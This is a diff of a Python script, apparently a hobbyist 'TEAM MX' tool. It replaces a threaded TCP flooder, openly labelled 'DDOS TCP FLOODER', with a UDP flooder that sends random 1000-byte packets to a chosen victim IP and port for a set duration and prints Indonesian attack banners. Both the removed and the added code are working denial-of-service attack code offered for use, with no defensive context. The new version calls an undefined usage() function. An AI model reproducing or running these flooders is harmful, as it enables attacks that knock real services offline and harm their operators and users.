@@ -1,35 +1,30 @@
-# DDOS TCP FLOODER
-# FOR XDEMPTERX
-# CODER XDEMPTERX 
-
+#TOOLS BY TEAM MX
+import time
 import socket
 import random
-import threading
+import sys
 
-ip = str(input('[+] Target Ip: '))
-port = int(input('[+] Port: '))
-pack = int(input('[+] Packet/s: '))
-thread = int(input('[+] Threads: '))
+def flood(victim, vport, duration):
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(1000)
+    timeout =  time.time() + duration
+    sent = 3000
 
+    while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        client.sendto(bytes, (victim, vport))
+        sent = sent + 1
+        print " MR. XDEMP MENYERANG!!! %s  MR. XDEMP MENYERBU!!! %s PORT %s "%(sent, victim, vport)
 
-def start():
-    hh = random._urandom(10)
-    xx = int(0)
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((ip,port))
-            s.send(hh)
-            for i in range(pack):
-                s.send(hh)
-            xx += 1
-            print('Mengirim Paket To Ip  '+ip+' | Send: '+str(xx))
-        except:    
-            s.close()
-            print('Done')
-for x in range(thread):
-    thred = threading.Thread(target=start)
-    thred.start()
+def main():
+    print len(sys.argv)
+    if len(sys.argv) != 4:
+        usage()
+    else:
+        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
 
-
-# DONE!
+if __name__ == '__main__':
+    main()
